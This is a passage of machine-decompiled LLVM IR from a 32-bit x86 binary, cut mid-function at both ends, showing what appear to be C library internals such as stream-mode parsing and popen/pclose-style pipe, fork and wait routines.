dec_label_pc_804bb5a:                             ; preds = %dec_label_pc_804baf2
  %v2_804bb5e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804bb5e, i32* @eax, align 4
  %v2_804bb63 = call i32 @function_804f65e(i32 %v2_804bb5e, i32 1)
  store i32 %v2_804bb63, i32* @eax, align 4
  br label %dec_label_pc_804bb6b

dec_label_pc_804bb6b:                             ; preds = %dec_label_pc_804baf2, %dec_label_pc_804bb5a
  %v0_804bb6b = load i32, i32* @esi, align 4
  %v1_804bb6b = add i32 %v0_804bb6b, 1
  %v2_804bb6b = inttoptr i32 %v1_804bb6b to i8*
  %v3_804bb6b = load i8, i8* %v2_804bb6b, align 1
  %v4_804bb6b = and i8 %v3_804bb6b, 64
  %v5_804bb6b = icmp eq i8 %v4_804bb6b, 0
  br i1 %v5_804bb6b, label %dec_label_pc_804bb7f, label %dec_label_pc_804bb71

dec_label_pc_804bb71:                             ; preds = %dec_label_pc_804bb6b
  %v1_804bb74 = add i32 %v0_804bb6b, 8
  %v2_804bb74 = inttoptr i32 %v1_804bb74 to i32*
  %v3_804bb74 = load i32, i32* %v2_804bb74, align 4
  %v1_804bb77 = call i32 @function_804eac9(i32 %v3_804bb74)
  store i32 %v1_804bb77, i32* @eax, align 4
  br label %dec_label_pc_804bb7f

dec_label_pc_804bb7f:                             ; preds = %dec_label_pc_804bb6b, %dec_label_pc_804bb71
  %v2_804bb8b = call i32 @function_804f65e(i32 %v2_804bb11, i32 134542939)
  %v1_804bb97 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_8056218.108 to i32))
  store i32 ptrtoint (i32* @global_var_8056218.108 to i32), i32* @eax, align 4
  %v0_804bb9d = load i32, i32* @global_var_80568e4.110, align 4
  %v1_804bb9d = add i32 %v0_804bb9d, 1
  store i32 %v1_804bb9d, i32* @global_var_80568e4.110, align 4
  %v2_804bba7 = call i32 @function_804f65e(i32 %v2_804bb11, i32 1)
  %v0_804bbac = call i32 @function_804d0b0()
  %v0_804bbb4 = load i32, i32* @edi, align 4
  store i32 %v0_804baaf, i32* @ebx, align 4
  store i32 %v0_804baae, i32* @esi, align 4
  store i32 %v0_804baad, i32* @edi, align 4
  store i32 %v0_804baac, i32* @ebp, align 4
  ret i32 %v0_804bbb4

; uselistorder directives
  uselistorder i32 %v2_804bb11, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_804bb7f, { 1, 0 }
  uselistorder label %dec_label_pc_804bb6b, { 1, 0 }
  uselistorder label %dec_label_pc_804baf2, { 1, 0 }
  uselistorder label %dec_label_pc_804badd, { 1, 0 }
}

define i32 @function_804bbbc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804bbbc:
  %v4_804bbcb = inttoptr i32 %arg2 to i8*
  %v5_804bbcb = call i32 @function_804bf78(i32 %arg1, i8* %v4_804bbcb, i32 0, i32 -1)
  ret i32 %v5_804bbcb
}

define i32 @function_804bbd4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804bbd4:
  %v4_804bbe5 = inttoptr i32 %arg1 to i8*
  %v5_804bbe5 = call i32 @function_804bc10(i8* %v4_804bbe5, i32 -1, i32 %arg2, i32 %arg3)
  ret i32 %v5_804bbe5
}

define i32 @function_804bbf0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804bbf0:
  %stack_var_12 = alloca i32, align 4
  %v2_804bbf3 = ptrtoint i32* %stack_var_12 to i32
  %v4_804bc06 = inttoptr i32 %arg1 to i8*
  %v5_804bc06 = call i32 @function_804bc10(i8* %v4_804bc06, i32 -1, i32 %arg2, i32 %v2_804bbf3)
  ret i32 %v5_804bc06
}

define i32 @function_804bc10(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804bc10:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bc10 = load i32, i32* @ebp, align 4
  %v0_804bc11 = load i32, i32* @edi, align 4
  %v0_804bc12 = load i32, i32* @esi, align 4
  %v0_804bc13 = load i32, i32* @ebx, align 4
  store i32 %v0_804bc13, i32* %stack_var_-16, align 4
  %v4_804bc17 = ptrtoint i8* %arg1 to i32
  store i32 %v4_804bc17, i32* @esi, align 4
  %v2_804bc1b = ptrtoint i32* %stack_var_-40 to i32
  store i32 %arg2, i32* @edi, align 4
  %v2_804bc26 = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_804bc26, i32* @ebp, align 4
  store i32 208, i32* %stack_var_-96, align 4
  %v1_804bc40 = sub i32 -1, %v4_804bc17
  %v1_804bc53 = call i32 @function_804c21f(i32 %v2_804bc1b)
  %v1_804bc63 = load i32, i32* @edi, align 4
  %tmp = icmp ule i32 %v1_804bc40, %v1_804bc63
  %v5_804bc65 = select i1 %tmp, i32 %v1_804bc40, i32 %v1_804bc63
  store i32 %v5_804bc65, i32* @ebx, align 4
  %v0_804bc68 = load i32, i32* @esi, align 4
  %v3_804bc92 = inttoptr i32 %arg3 to i8*
  %v4_804bc92 = call i32 @function_804c38c(i32 %v2_804bc26, i8* %v3_804bc92, i32 %arg4)
  %v1_804bc9a = icmp eq i32 %v5_804bc65, 0
  store i32 %v4_804bc92, i32* %edx.global-to-local, align 4
  br i1 %v1_804bc9a, label %dec_label_pc_804bcb6, label %dec_label_pc_804bcaf

dec_label_pc_804bcaf:                             ; preds = %dec_label_pc_804bc10
  %stack_var_-80.0 = inttoptr i32 %v0_804bc68 to i8*
  store i8 0, i8* %stack_var_-80.0, align 1
  %v0_804bcb9.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804bcb6

dec_label_pc_804bcb6:                             ; preds = %dec_label_pc_804bc10, %dec_label_pc_804bcaf
  %v0_804bcb9 = phi i32 [ %v4_804bc92, %dec_label_pc_804bc10 ], [ %v0_804bcb9.pre, %dec_label_pc_804bcaf ]
  %v2_804bcbb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804bcbb, i32* @ebx, align 4
  store i32 %v0_804bc12, i32* @esi, align 4
  store i32 %v0_804bc11, i32* @edi, align 4
  store i32 %v0_804bc10, i32* @ebp, align 4
  ret i32 %v0_804bcb9

; uselistorder directives
  uselistorder i32 %v1_804bc63, { 1, 0 }
  uselistorder i32 %v1_804bc40, { 1, 0 }
  uselistorder label %dec_label_pc_804bcb6, { 1, 0 }
}

define i32 @function_804bcc0(i32 %arg1) local_unnamed_addr {
dec_label_pc_804bcc0:
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  store i32 %arg1, i32* @edi, align 4
  %v2_804bcd4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804bcd4, i32* @eax, align 4
  store i32 %v2_804bcd4, i32* %stack_var_-60, align 4
  %v2_804bcd9 = call i32 @function_804f65e(i32 %v2_804bcd4, i32 134542939)
  store i32 ptrtoint (i32* @global_var_80568c4.111 to i32), i32* %stack_var_-60, align 4
  %v1_804bce5 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_80568c4.111 to i32))
  %v0_804bcea = load i32, i32* @global_var_80568dc.112, align 4
  store i32 %v0_804bcea, i32* @ebx, align 4
  %v1_804bcf3 = icmp eq i32 %v0_804bcea, 0
  br i1 %v1_804bcf3, label %dec_label_pc_804bd29, label %dec_label_pc_804bcf7

dec_label_pc_804bcf7:                             ; preds = %dec_label_pc_804bcc0
  %v1_804bcf7 = add i32 %v0_804bcea, 4
  %v2_804bcf7 = inttoptr i32 %v1_804bcf7 to i32*
  %v3_804bcf7 = load i32, i32* %v2_804bcf7, align 4
  %v4_804bcf7 = load i32, i32* @edi, align 4
  %v15_804bcf7 = icmp eq i32 %v3_804bcf7, %v4_804bcf7
  %v1_804bcfa = icmp eq i1 %v15_804bcf7, false
  br i1 %v1_804bcfa, label %dec_label_pc_804bd18, label %dec_label_pc_804bcfc

dec_label_pc_804bcfc:                             ; preds = %dec_label_pc_804bcf7
  %v1_804bcfc = inttoptr i32 %v0_804bcea to i32*
  %v2_804bcfc = load i32, i32* %v1_804bcfc, align 4
  store i32 %v2_804bcfc, i32* @global_var_80568dc.112, align 4
  br label %dec_label_pc_804bd29

dec_label_pc_804bd05:                             ; preds = %dec_label_pc_804bd18
  %v0_804bd05 = load i32, i32* %stack_var_-60, align 4
  %v1_804bd05 = call i32 @function_804baa4(i32 %v0_804bd05)
  %v1_804bd0a = inttoptr i32 %v1_804bd05 to i32*
  store i32 22, i32* %v1_804bd0a, align 4
  br label %dec_label_pc_804bd29

dec_label_pc_804bd12:                             ; preds = %dec_label_pc_804bd55
  %v3_804bd12 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804bd77

dec_label_pc_804bd18:                             ; preds = %dec_label_pc_804bcf7, %dec_label_pc_804bd20
  %v1_804bd27 = phi i32 [ %v2_804bd1a, %dec_label_pc_804bd20 ], [ %v0_804bcea, %dec_label_pc_804bcf7 ]
  %v1_804bd1a = inttoptr i32 %v1_804bd27 to i32*
  %v2_804bd1a = load i32, i32* %v1_804bd1a, align 4
  store i32 %v2_804bd1a, i32* @ebx, align 4
  %v1_804bd1c = icmp eq i32 %v2_804bd1a, 0
  br i1 %v1_804bd1c, label %dec_label_pc_804bd05, label %dec_label_pc_804bd20

dec_label_pc_804bd20:                             ; preds = %dec_label_pc_804bd18
  %v1_804bd20 = add i32 %v2_804bd1a, 4
  %v2_804bd20 = inttoptr i32 %v1_804bd20 to i32*
  %v3_804bd20 = load i32, i32* %v2_804bd20, align 4
  %v15_804bd20 = icmp eq i32 %v3_804bd20, %v4_804bcf7
  %v1_804bd23 = icmp eq i1 %v15_804bd20, false
  br i1 %v1_804bd23, label %dec_label_pc_804bd18, label %dec_label_pc_804bd25

dec_label_pc_804bd25:                             ; preds = %dec_label_pc_804bd20
  %v1_804bd25 = inttoptr i32 %v2_804bd1a to i32*
  %v2_804bd25 = load i32, i32* %v1_804bd25, align 4
  store i32 %v2_804bd25, i32* %v1_804bd1a, align 4
  br label %dec_label_pc_804bd29

dec_label_pc_804bd29:                             ; preds = %dec_label_pc_804bcc0, %dec_label_pc_804bd05, %dec_label_pc_804bcfc, %dec_label_pc_804bd25
  store i32 %v2_804bcd4, i32* @eax, align 4
  store i32 %v2_804bcd4, i32* %stack_var_-60, align 4
  %v2_804bd32 = call i32 @function_804f65e(i32 %v2_804bcd4, i32 1)
  %v0_804bd3a = load i32, i32* @ebx, align 4
  %v1_804bd3a = icmp eq i32 %v0_804bd3a, 0
  br i1 %v1_804bd3a, label %dec_label_pc_804bd74, label %dec_label_pc_804bd3e

dec_label_pc_804bd3e:                             ; preds = %dec_label_pc_804bd29
  %v1_804bd41 = add i32 %v0_804bd3a, 8
  %v2_804bd41 = inttoptr i32 %v1_804bd41 to i32*
  %v3_804bd41 = load i32, i32* %v2_804bd41, align 4
  store i32 %v3_804bd41, i32* @esi, align 4
  store i32 %v0_804bd3a, i32* %stack_var_-60, align 4
  %v1_804bd45 = call i32 @function_804eac9(i32 %v0_804bd3a)
  store i32 %v1_804bd45, i32* @eax, align 4
  %v0_804bd4a = load i32, i32* @edi, align 4
  store i32 %v0_804bd4a, i32* %stack_var_-60, align 4
  %v1_804bd4d = inttoptr i32 %v0_804bd4a to i16*
  %v2_804bd4d = call i32 @function_804baac(i16* %v1_804bd4d)
  %v2_804bd58 = ptrtoint i32* %stack_var_-16 to i32
  br label %dec_label_pc_804bd55

dec_label_pc_804bd55:                             ; preds = %dec_label_pc_804bd6a, %dec_label_pc_804bd3e
  %v0_804bd55 = phi i32 [ %v1_804bd6a, %dec_label_pc_804bd6a ], [ %v2_804bd4d, %dec_label_pc_804bd3e ]
  %v0_804bd5d = load i32, i32* @esi, align 4
  store i32 %v0_804bd5d, i32* %stack_var_-60, align 4
  %v4_804bd5e = call i32 @function_804ba30(i32 %v0_804bd5d, i32 %v2_804bd58, i32 0, i32 %v0_804bd55)
  %v2_804bd66 = icmp slt i32 %v4_804bd5e, 0
  %v1_804bd68 = icmp eq i1 %v2_804bd66, false
  br i1 %v1_804bd68, label %dec_label_pc_804bd12, label %dec_label_pc_804bd6a

dec_label_pc_804bd6a:                             ; preds = %dec_label_pc_804bd55
  %v0_804bd6a = load i32, i32* %stack_var_-60, align 4
  %v1_804bd6a = call i32 @function_804baa4(i32 %v0_804bd6a)
  %v1_804bd6f = inttoptr i32 %v1_804bd6a to i32*
  %v2_804bd6f = load i32, i32* %v1_804bd6f, align 4
  %v11_804bd6f = icmp eq i32 %v2_804bd6f, 4
  br i1 %v11_804bd6f, label %dec_label_pc_804bd55, label %dec_label_pc_804bd74.loopexit

dec_label_pc_804bd74.loopexit:                    ; preds = %dec_label_pc_804bd6a
  br label %dec_label_pc_804bd74

dec_label_pc_804bd74:                             ; preds = %dec_label_pc_804bd74.loopexit, %dec_label_pc_804bd29
  br label %dec_label_pc_804bd77

dec_label_pc_804bd77:                             ; preds = %dec_label_pc_804bd12, %dec_label_pc_804bd74
  %storemerge = phi i32 [ -1, %dec_label_pc_804bd74 ], [ %v3_804bd12, %dec_label_pc_804bd12 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804bd6a, { 1, 0 }
  uselistorder i32 %v0_804bd3a, { 2, 1, 0, 3 }
  uselistorder i32 %v2_804bd1a, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_804bcd4, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 0, 2, 3, 4, 5, 1, 6, 7 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_804bd77, { 1, 0 }
  uselistorder label %dec_label_pc_804bd29, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804bd18, { 1, 0 }
}

define i32 @function_804bd7e(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_804bd7e:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v15_804bd80 = ptrtoint i32* %stack_var_-60 to i32
  %v4_804bd83 = ptrtoint i8* %arg2 to i32
  store i32 %v4_804bd83, i32* @ebx, align 4
  %v2_804bd87 = load i8, i8* %arg2, align 1
  %v10_804bd89 = icmp eq i8 %v2_804bd87, 119
  br i1 %v10_804bd89, label %dec_label_pc_804bdb8, label %dec_label_pc_804bd8d

dec_label_pc_804bd8d:                             ; preds = %dec_label_pc_804bd7e
  %v10_804bd8d = icmp eq i8 %v2_804bd87, 114
  br i1 %v10_804bd8d, label %dec_label_pc_804bdb8, label %dec_label_pc_804bd99

dec_label_pc_804bd99:                             ; preds = %dec_label_pc_804bd8d
  %v1_804bd99 = call i32 @function_804baa4(i32 1)
  %v1_804bd9e = inttoptr i32 %v1_804bd99 to i32*
  store i32 22, i32* %v1_804bd9e, align 4
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804bf6f

dec_label_pc_804bdb8:                             ; preds = %dec_label_pc_804bd7e, %dec_label_pc_804bd8d
  %v0_804be86 = phi i32 [ 1, %dec_label_pc_804bd8d ], [ 0, %dec_label_pc_804bd7e ]
  store i32 12, i32* %stack_var_-76, align 4
  %v1_804bdbd = call i32 @function_804ddba(i32 12)
  %v1_804bdc9 = icmp eq i32 %v1_804bdbd, 0
  store i32 0, i32* %stack_var_-60, align 4
  br i1 %v1_804bdc9, label %dec_label_pc_804bf6f, label %dec_label_pc_804bdd8

dec_label_pc_804bdd8:                             ; preds = %dec_label_pc_804bdb8
  %v2_804bddb = ptrtoint i32* %stack_var_-16 to i32
  store i32 %v2_804bddb, i32* %stack_var_-76, align 4
  %v1_804bde0 = call i32 @function_804fd88(i32 %v2_804bddb)
  %v1_804bde8 = icmp eq i32 %v1_804bde0, 0
  %v1_804bdea = icmp eq i1 %v1_804bde8, false
  br i1 %v1_804bdea, label %dec_label_pc_804bf58, label %dec_label_pc_804bdf0

dec_label_pc_804bdf0:                             ; preds = %dec_label_pc_804bdd8
  %tmp37 = sub nsw i32 0, %v0_804be86
  %v2_804bdf4 = and i32 %tmp37, 4
  %v3_804bdf4 = add i32 %v15_804bd80, 44
  %v4_804bdf4 = add i32 %v3_804bdf4, %v2_804bdf4
  %v5_804bdf4 = inttoptr i32 %v4_804bdf4 to i32*
  %v6_804bdf4 = load i32, i32* %v5_804bdf4, align 4
  %v5_804be01 = xor i32 %v0_804be86, 1
  %tmp38 = sub nsw i32 0, %v5_804be01
  %v2_804be05 = and i32 %tmp38, 4
  %v4_804be05 = add i32 %v3_804bdf4, %v2_804be05
  %v5_804be05 = inttoptr i32 %v4_804be05 to i32*
  %v6_804be05 = load i32, i32* %v5_804be05, align 4
  %v0_804be0d = load i32, i32* @ecx, align 4
  %v0_804be0f = load i32, i32* @ebx, align 4
  store i32 %v6_804be05, i32* %stack_var_-76, align 4
  %v5_804be11 = call i32 @function_804ff94(i32 %v6_804be05, i32 %v0_804be0f, i32 %v0_804be0d, i32 %v0_804be0d)
  store i32 %v5_804be11, i32* %stack_var_-60, align 4
  %v1_804be1d = icmp eq i32 %v5_804be11, 0
  %v1_804be1f = icmp eq i1 %v1_804be1d, false
  br i1 %v1_804be1f, label %dec_label_pc_804be3c, label %dec_label_pc_804be21

dec_label_pc_804be21:                             ; preds = %dec_label_pc_804bdf0
  store i32 %v6_804be05, i32* %stack_var_-76, align 4
  %v1_804be28 = call i32 @function_804b7d8(i32 %v6_804be05)
  %v2_804be2d = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_804be2d, i32* %edx.global-to-local, align 4
  store i32 %v6_804bdf4, i32* %stack_var_-76, align 4
  %v1_804be32 = call i32 @function_804b7d8(i32 %v6_804bdf4)
  br label %dec_label_pc_804bf55

dec_label_pc_804be3c:                             ; preds = %dec_label_pc_804bdf0
  %v2_804be47 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804be47, i32* @eax, align 4
  store i32 %v2_804be47, i32* %stack_var_-76, align 4
  %v3_804be4c = call i32 @function_804f65e(i32 %v2_804be47, i32 134542939)
  store i32 ptrtoint (i32* @global_var_80568c4.111 to i32), i32* %stack_var_-76, align 4
  %v1_804be58 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_80568c4.111 to i32))
  %v0_804be5d = call i32 @function_804f97c()
  store i32 %v0_804be5d, i32* @eax, align 4
  %v1_804be65 = icmp eq i32 %v0_804be5d, 0
  store i32 %v0_804be5d, i32* @ebx, align 4
  %v1_804be69 = icmp eq i1 %v1_804be65, false
  br i1 %v1_804be69, label %dec_label_pc_804bee3, label %dec_label_pc_804be6b

dec_label_pc_804be6b:                             ; preds = %dec_label_pc_804be3c
  store i32 %v6_804be05, i32* %stack_var_-76, align 4
  %v1_804be72 = call i32 @function_804b7d8(i32 %v6_804be05)
  store i32 %v0_804be86, i32* %edx.global-to-local, align 4
  %v15_804be7e = icmp eq i32 %v6_804bdf4, %v0_804be86
  br i1 %v15_804be7e, label %dec_label_pc_804be9d, label %dec_label_pc_804be84

dec_label_pc_804be84:                             ; preds = %dec_label_pc_804be6b
  store i32 %v6_804bdf4, i32* %stack_var_-76, align 4
  %v5_804be8b = call i32 @function_804fb14(i32 %v6_804bdf4, i32 %v0_804be86, i32 %v1_804be72, i32 %v1_804be72)
  store i32 %v6_804bdf4, i32* %stack_var_-76, align 4
  %v1_804be95 = call i32 @function_804b7d8(i32 %v6_804bdf4)
  br label %dec_label_pc_804be9d

dec_label_pc_804be9d:                             ; preds = %dec_label_pc_804be6b, %dec_label_pc_804be84
  %v0_804be9d = load i32, i32* @global_var_80568dc.112, align 4
  store i32 %v0_804be9d, i32* @ebx, align 4
  %v1_804beb82 = icmp eq i32 %v0_804be9d, 0
  %v1_804beba9 = icmp eq i1 %v1_804beb82, false
  br i1 %v1_804beba9, label %dec_label_pc_804bea5, label %dec_label_pc_804bebc

dec_label_pc_804bea5:                             ; preds = %dec_label_pc_804be9d, %dec_label_pc_804bea5
  %v0_804bea5 = phi i32 [ %v2_804beb3, %dec_label_pc_804bea5 ], [ %v0_804be9d, %dec_label_pc_804be9d ]
  %v1_804bea5 = add i32 %v0_804bea5, 4
  %v2_804bea5 = inttoptr i32 %v1_804bea5 to i32*
  %v3_804bea5 = load i32, i32* %v2_804bea5, align 4
  %v1_804beab = add i32 %v3_804bea5, 4
  %v2_804beab = inttoptr i32 %v1_804beab to i32*
  %v3_804beab = load i32, i32* %v2_804beab, align 4
  store i32 %v3_804beab, i32* %stack_var_-76, align 4
  %v1_804beae = call i32 @function_804b7d8(i32 %v3_804beab)
  %v0_804beb3 = load i32, i32* @ebx, align 4
  %v1_804beb3 = inttoptr i32 %v0_804beb3 to i32*
  %v2_804beb3 = load i32, i32* %v1_804beb3, align 4
  store i32 %v2_804beb3, i32* @ebx, align 4
  %v1_804beb8 = icmp eq i32 %v2_804beb3, 0
  %v1_804beba = icmp eq i1 %v1_804beb8, false
  br i1 %v1_804beba, label %dec_label_pc_804bea5, label %dec_label_pc_804bebc

dec_label_pc_804bebc:                             ; preds = %dec_label_pc_804bea5, %dec_label_pc_804be9d
  store i32 0, i32* %stack_var_-76, align 4
  %v8_804bed4 = call i32 @function_804f2dc(i32 ptrtoint ([8 x i8]* @global_var_8053a63.115 to i32), i32 ptrtoint ([3 x i8]* @global_var_8053a68.114 to i32), i32 ptrtoint ([3 x i8]* @global_var_8053a60.113 to i32), i32 %arg1, i32 0)
  store i32 127, i32* %stack_var_-76, align 4
  %v1_804bede = call i32 @function_804fab8(i32 127)
  unreachable

dec_label_pc_804bee3:                             ; preds = %dec_label_pc_804be3c
  store i32 %v2_804be47, i32* @esi, align 4
  store i32 %v2_804be47, i32* %stack_var_-76, align 4
  %v3_804beec = call i32 @function_804f65e(i32 %v2_804be47, i32 1)
  store i32 %v6_804bdf4, i32* %stack_var_-76, align 4
  %v1_804bef6 = call i32 @function_804b7d8(i32 %v6_804bdf4)
  store i32 %v1_804bef6, i32* @eax, align 4
  %v0_804befe = load i32, i32* @ebx, align 4
  %tmp40 = icmp slt i32 %v0_804befe, 1
  br i1 %tmp40, label %dec_label_pc_804bf49, label %dec_label_pc_804bf02

dec_label_pc_804bf02:                             ; preds = %dec_label_pc_804bee3
  store i32 %v1_804bdbd, i32* @eax, align 4
  %v2_804bf06 = add i32 %v1_804bdbd, 8
  %v3_804bf06 = inttoptr i32 %v2_804bf06 to i32*
  store i32 %v0_804befe, i32* %v3_804bf06, align 4
  %v2_804bf09 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_804bf09, i32* %edx.global-to-local, align 4
  %v1_804bf0c = load i32, i32* @eax, align 4
  %v2_804bf0c = add i32 %v1_804bf0c, 4
  %v3_804bf0c = inttoptr i32 %v2_804bf0c to i32*
  store i32 %v2_804bf09, i32* %v3_804bf0c, align 4
  store i32 %v2_804be47, i32* %stack_var_-76, align 4
  %v3_804bf1b = call i32 @function_804f65e(i32 %v2_804be47, i32 134542939)
  store i32 ptrtoint (i32* @global_var_80568c4.111 to i32), i32* %stack_var_-76, align 4
  %v1_804bf27 = call i32 @function_804f65b(i32 ptrtoint (i32* @global_var_80568c4.111 to i32))
  store i32 %v1_804bdbd, i32* %edx.global-to-local, align 4
  %v0_804bf30 = load i32, i32* @global_var_80568dc.112, align 4
  store i32 %v0_804bf30, i32* @eax, align 4
  %v2_804bf35 = inttoptr i32 %v1_804bdbd to i32*
  store i32 %v0_804bf30, i32* %v2_804bf35, align 4
  %v0_804bf38 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804bf38, i32* @global_var_80568dc.112, align 4
  store i32 %v2_804be47, i32* %stack_var_-76, align 4
  %v3_804bf42 = call i32 @function_804f65e(i32 %v2_804be47, i32 1)
  %v2_804bf6f.pre.pre = load i32, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804bf6c

dec_label_pc_804bf49:                             ; preds = %dec_label_pc_804bee3
  %v3_804bf4c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_804bf4c, i32* %stack_var_-76, align 4
  %v1_804bf50 = inttoptr i32 %v3_804bf4c to i16*
  %v2_804bf50 = call i32 @function_804baac(i16* %v1_804bf50)
  br label %dec_label_pc_804bf55

dec_label_pc_804bf55:                             ; preds = %dec_label_pc_804be21, %dec_label_pc_804bf49
  br label %dec_label_pc_804bf58

dec_label_pc_804bf58:                             ; preds = %dec_label_pc_804bdd8, %dec_label_pc_804bf55
  store i32 %v1_804bdbd, i32* %stack_var_-76, align 4
  %v1_804bf5f = call i32 @function_804eac9(i32 %v1_804bdbd)
  store i32 0, i32* %stack_var_-60, align 4
  br label %dec_label_pc_804bf6c

dec_label_pc_804bf6c:                             ; preds = %dec_label_pc_804bf02, %dec_label_pc_804bf58
  %v2_804bf6f.pre = phi i32 [ %v2_804bf6f.pre.pre, %dec_label_pc_804bf02 ], [ 0, %dec_label_pc_804bf58 ]
  br label %dec_label_pc_804bf6f

dec_label_pc_804bf6f:                             ; preds = %dec_label_pc_804bdb8, %dec_label_pc_804bd99, %dec_label_pc_804bf6c
  %v2_804bf6f = phi i32 [ 0, %dec_label_pc_804bdb8 ], [ 0, %dec_label_pc_804bd99 ], [ %v2_804bf6f.pre, %dec_label_pc_804bf6c ]
  ret i32 %v2_804bf6f

; uselistorder directives
  uselistorder i32 %v0_804befe, { 1, 0 }
  uselistorder i32 %v2_804beb3, { 1, 2, 0 }
  uselistorder i32 %v2_804be47, { 1, 0, 3, 2, 5, 4, 6, 8, 7, 9 }
  uselistorder i32 %v6_804be05, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v6_804bdf4, { 8, 7, 4, 3, 6, 5, 0, 2, 1 }
  uselistorder i32 %v2_804bddb, { 1, 0 }
  uselistorder i32 %v1_804bdbd, { 5, 4, 1, 0, 3, 2, 6 }
  uselistorder i32 %v0_804be86, { 1, 0, 4, 2, 3 }
  uselistorder i32* %stack_var_-60, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_80568c4.111 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8* %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804bf6f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804bf6c, { 1, 0 }
  uselistorder label %dec_label_pc_804bf58, { 1, 0 }
  uselistorder label %dec_label_pc_804bf55, { 1, 0 }
  uselistorder label %dec_label_pc_804bea5, { 1, 0 }
  uselistorder label %dec_label_pc_804be9d, { 1, 0 }
  uselistorder label %dec_label_pc_804bdb8, { 1, 0 }
}

define i32 @function_804bf78(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804bf78:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804bf78 = load i32, i32* @ebp, align 4
  %v0_804bf79 = load i32, i32* @edi, align 4
  %v0_804bf7a = load i32, i32* @esi, align 4
  %v0_804bf7b = load i32, i32* @ebx, align 4
  store i32 %v0_804bf7b, i32* %stack_var_-16, align 4
  %v4_804bf7f = ptrtoint i8* %arg2 to i32
  store i32 %v4_804bf7f, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %v2_804bf8f = load i8, i8* %arg2, align 1
  %v3_804bf8f = zext i8 %v2_804bf8f to i32
  %v4_804bf8f = load i32, i32* @eax, align 4
  %v5_804bf8f = and i32 %v4_804bf8f, -256
  %v6_804bf8f = or i32 %v5_804bf8f, %v3_804bf8f
  store i32 %v6_804bf8f, i32* %eax.global-to-local, align 4
  %v10_804bf91 = icmp eq i8 %v2_804bf8f, 114
  br i1 %v10_804bf91, label %dec_label_pc_804bfd3, label %dec_label_pc_804bf95

dec_label_pc_804bf95:                             ; preds = %dec_label_pc_804bf78
  %v10_804bf95 = icmp eq i8 %v2_804bf8f, 119
  store i32 577, i32* @ebx, align 4
  br i1 %v10_804bf95, label %dec_label_pc_804bfd5, label %dec_label_pc_804bf9e

dec_label_pc_804bf9e:                             ; preds = %dec_label_pc_804bf95
  %v10_804bf9e = icmp eq i8 %v2_804bf8f, 97
  store i32 1089, i32* @ebx, align 4
  br i1 %v10_804bf9e, label %dec_label_pc_804bfd5, label %dec_label_pc_804bfa6

dec_label_pc_804bfa6:                             ; preds = %dec_label_pc_804c04e, %dec_label_pc_804c028, %dec_label_pc_804bf9e
  %v0_804bfa6 = load i32, i32* %stack_var_-16, align 4
  %v1_804bfa6 = call i32 @function_804baa4(i32 %v0_804bfa6)
  store i32 %v1_804bfa6, i32* %eax.global-to-local, align 4
  %v0_804bfab = load i32, i32* @ebp, align 4
  %v1_804bfab = icmp eq i32 %v0_804bfab, 0
  %v1_804bfad = inttoptr i32 %v1_804bfa6 to i32*
  store i32 22, i32* %v1_804bfad, align 4
  br i1 %v1_804bfab, label %dec_label_pc_804c1af, label %dec_label_pc_804bfb9

dec_label_pc_804bfb9:                             ; preds = %dec_label_pc_804c071, %dec_label_pc_804bfa6
  %v0_804bfb9 = load i32, i32* @ebp, align 4
  %v1_804bfb9 = add i32 %v0_804bfb9, 1
  %v2_804bfb9 = inttoptr i32 %v1_804bfb9 to i8*
  %v3_804bfb9 = load i8, i8* %v2_804bfb9, align 1
  %v4_804bfb9 = and i8 %v3_804bfb9, 32
  %v5_804bfb9 = icmp eq i8 %v4_804bfb9, 0
